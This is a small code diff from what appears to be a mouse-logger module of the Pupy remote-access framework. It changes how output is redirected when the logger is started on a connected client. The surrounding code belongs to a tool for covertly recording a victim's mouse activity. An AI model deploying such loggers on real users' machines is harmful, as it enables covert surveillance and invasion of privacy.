@@ -52,7 +52,7 @@ class MouseLoggerModule(PupyModule):
             else:
                 self.mouselogger=self.client.conn.modules["pupwinutils.mouselogger"].get_mouselogger()
                 if not self.mouselogger.is_alive():
-                    with redirected_stdo(self.client.conn):
+                    with redirected_stdo(self):
                         self.mouselogger.start()
                     self.success("mouselogger started")
                 else:
